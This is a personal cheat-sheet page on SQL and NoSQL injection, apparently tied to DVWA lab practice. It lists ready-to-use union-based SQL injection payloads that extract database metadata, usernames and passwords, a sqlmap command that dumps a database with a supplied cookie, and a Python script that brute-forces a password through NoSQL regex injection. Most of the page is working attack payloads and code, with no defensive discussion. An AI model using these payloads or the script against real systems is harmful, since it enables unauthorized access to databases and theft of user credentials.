---
title: SQL CheatSheet
date: 2021-09-12
categories:
  - Notes
tags:
  - Notes
  - SQL
excerpt_separator: <!--more-->
---


<style>
  pre {
     overflow-x: auto;
     white-space: pre-wrap;
     white-space: -moz-pre-wrap;
     white-space: -pre-wrap;
     white-space: -o-pre-wrap;
     word-wrap: break-word;
  }
</style>


<p><img src="/assets/images/dvwa/SQLi/sql.png" alt="" /></p>

<h1>SQL Injection</h1>
<p>CheatSheet</p>
<p>
Display Database Version<br>
%' or 0=0 union select null, version() #<br>
<br>
Display Database User<br>
%' or 0=0 union select null, user() #<br>
<br>
Display Database Name<br>
%' or 0=0 union select null, database() #<br>
<br>
Display all tables in information_schema<br>
%' and 1=0 union select null, table_name from information_schema.tables #<br>
<br>
Display all the user tables in information_schema<br>
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#<br>
<br>
Display all the columns fields in the information_schema user table<br>
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #<br>
<br>
Display all the columns field contents in the information_schema user table<br>
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #<br>
</p>

<code>sqlmap http://[IP]/admin?user=3 --cookie='token=[Enter Cookie] --technique=U --delay=2 -dump</code>

<h2>Nosql</h2>

<h4>shitscript</h4>


<pre><code>
import requests
bruten = '1234567890abcdef-'
xx=0
x = bruten[xx]
keylist = ""
keystr = keylist + x
#URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
r = requests.get(URL)
s = (len(r.content))

while True:
  try:
    for i in range(0, 17):    
      x = bruten[xx]
      keystr = keylist + x
      #URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
      URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
      print(URL)
      print(keystr)
      #print(keylist)
      r = requests.get(URL)
      s = (len(r.content))
      #print(s)
      if s == 1614:
        keystr = keylist + x
        keystr = keystr
        keylist = keylist + x
        #print(keylist)
        xx=0
        continue
  
      else:
        #keylist = ""
        keystr = keylist + x
        keystr = keystr
        xx+=1
        continue
    except:
      print("crackarooniedddddd")
      print('password is ' + keystr[:-1])
      break  </code></pre>